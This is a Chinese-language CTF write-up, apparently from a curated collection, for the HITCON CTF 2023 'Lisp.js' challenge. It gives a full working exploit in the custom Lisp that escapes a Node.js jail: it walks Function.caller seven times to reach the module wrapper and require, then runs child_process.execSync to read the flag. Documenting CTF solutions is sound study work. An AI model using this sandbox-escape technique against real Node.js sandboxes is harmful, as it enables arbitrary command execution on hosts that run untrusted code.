---
title: HITCON CTF 2023 Quals writeup
contest: HITCON CTF 2023 Quals
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [node.js, lisp.js, jailbreak, prototype-pollution, child_process, execsync, caller, arguments]
attack_chain:
  - Node.js 20-alpine + pwn.red/jail
  - Lisp.js v0.1.0 自定义语言
  - --disallow-code-generation-from-strings
  - --disable-proto=delete (防 __proto__ 删除)
  - 攻击: (let f (fun (x) (. f "caller"))) 反射
  - 递归caller七次拿module wrapper
  - 拿require参数+module.children[0].exports.extendedScope
  - extendedScope内置Object/Array/String+额外js互操作
  - 调用require("child_process").execSync("./readflag")
  - flag: hitcon{it_is_actually_a_node.js_jail_in_disguise!!}
key_payload: 7次 .caller拿module wrapper → require("child_process").execSync
one_liner: HITCON CTF 2023 Lisp.js jail：递归caller 7次拿到module→execSync读flag
lesson: Function.caller + 递归拿Node.js module wrapper是Node jail经典逃逸
quality: high
---

# HITCON CTF 2023 Quals writeup

## 题目信息
- 比赛：HITCON CTF 2023 Quals
- 题目：Lisp.js
- 类别：Web（Node.js jail）

## 关键攻击链
### 1. 环境
```dockerfile
FROM node:20-alpine AS app
FROM pwn.red/jail
ENV JAIL_MEM=64M JAIL_PIDS=20 JAIL_TMP_SIZE=1M
node --disallow-code-generation-from-strings --disable-proto=delete main.js "$tmpfile"
```

### 2. Lisp.js runtime
```javascript
class Scope {
    constructor(parent) {
        this.parent = parent;
        this.table = Object.create(null);
    }
    get(name) { ... }
}
function astToExpr(ast) { ... }
function basicScope() {
    scope.set('do', function _do(args, scope) { ... });
    scope.set('print', function _print(args, scope) { ... });
    scope.set('.', function _dot(name, scope) {
        const obj = name[0](scope);
        const prop = name[1](scope);
        return obj[prop];
    });
}
function extendedScope() {
    const scope = basicScope();
    scope.set('Object', Object);
    scope.set('Array', Array);
    scope.set('String', String);
}
```

### 3. caller 反射
```lisp
(do
    (let f (fun (x) (. f "caller")))
    (print (f 1)))
; [Function: _sexpr]
```

### 4. 7 次 caller 拿 module
```lisp
(do
    (let x (fun ()
        (. (. (. (. (. (. (. x "caller") "caller") "caller") "caller") "caller") "caller") "caller")))
    (let res (x))
    (list res (+ "" res)))
; [
;   [Function (anonymous)],
;   'function (exports, require, module, __filename, __dirname) {\n' +
;   "const { lispEval } = require('./runtime')\n" +
;   ...
; ]
```

### 5. 完整 exp
```lisp
(do
    (let get_module (fun ()
        (. (. (. (. (. (. (. (. (. get_module "caller") "caller") "caller") "caller") "caller") "caller") "caller") "arguments")"2")))
    (let module (get_module))
    (let extendedScope (. (. (. (. module "children") "0") "exports") "extendedScope"))
    (let e (extendedScope))
    (let get_require (fun ()
        (. (. (. (. (. (. (. (. get_require "caller") "caller") "caller") "caller") "caller") "caller") "caller") "arguments")))
    (let .. (. (. e "table") ".."))
    (let j2l (. (. e "table") "j2l"))
    (let require_ (get_require))
    (let require (j2l (.. require_ "1")))
    (let child_process (require "child_process"))
    (let execSync (j2l (.. child_process "execSync")))
    (+ (execSync "./readflag") ""))
```

### 6. flag
- `hitcon{it_is_actually_a_node.js_jail_in_disguise!!}`

## 评分
- quality: high（Lisp.js + Node.js jail + 7 次 caller 反射 + extendedScope 逃逸）
